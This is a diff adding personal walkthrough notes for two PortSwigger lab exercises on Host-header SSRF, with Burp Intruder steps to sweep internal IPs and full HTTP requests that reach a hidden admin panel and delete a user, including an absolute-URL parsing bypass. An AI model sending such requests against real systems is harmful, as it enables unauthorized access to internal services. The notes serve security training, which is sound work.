@@ -58,9 +58,73 @@ csrf=YOUR-CSRF-TOKEN&username=carlos
 ```
 
 #### Routing-based SSRF
-TODO
+- use intruder and deselect Update Host header to match target:
+```
+Host: 192.168.0.§2§
+```
+- numbers 0 to 255
+- find response with 200
+```
+GET /admin HTTP/2
+Host: 192.168.0.101
+```
+- go to browser try form for deletion
+- then in repeater:
+```
+POST /admin/delete HTTP/2
+Host: 192.168.0.101
+...
+
+csrf=xfzUXPR8ZXwVhFrbPwcl00EBwAwp0c2V&username=carlos
+```
+- also you can scan website and scanner will point to hTTP host header vulb
 
 #### SSRF via flawed request parsing
-TODO
+- use intruder and deselect Update Host header to match target:
+```
+Host: 192.168.0.§2§
+```
+- find that if you add @ to the path you will find 504 and one 404, otherwise all responses will be 403
+- that will help to find correct IP
+- then based on this [article](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)  and theory from PortSwigger create a payload:
+```
+GET http://192.168.0.35@/admin HTTP/2
+Host: 192.168.0.35
+```
+- you will get admin panel
+```
+POST http://192.168.0.35@/admin/delete HTTP/2
+Host: 192.168.0.35
+...
 
+username=carlos&csrf=kKfDPH4NQBZWywvnLrNEtC5ry9upQnkj
+```
+or
 
+- Observe that the website validates the Host header and blocks any requests in which it has been modified.
+- Observe that you can also access the home page by supplying an absolute URL in the request line as follows:
+```
+GET https://YOUR-LAB-ID.web-security-academy.net/
+```
+- Notice that when you do this, modifying the Host header no longer causes your request to be blocked. Instead, you 
+receive a timeout error. This suggests that the absolute URL is being validated instead of the Host header. 
+- Then find that the following request will trigger an HTTP request to your Collaborator server:
+```
+GET https://YOUR-LAB-ID.web-security-academy.net/
+Host: BURP-COLLABORATOR-SUBDOMAIN
+```
+- scan the IP range 192.168.0.0/24 to identify the IP address of the admin interface for 
+```
+GET https://YOUR-LAB-ID.web-security-academy.net/
+Host: BURP-COLLABORATOR-SUBDOMAIN
+```
+- for identified IP:
+```
+GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete
+Host: IP
+```
+- then:
+```
+GET https://YOUR-LAB-ID.web-security-academy.net/admin/delete?csrf=QCT5OmPeAAPnyTKyETt29LszLL7CbPop&username=carlos
+```
+- copy the session cookie from the **Set-Cookie** and change to POST
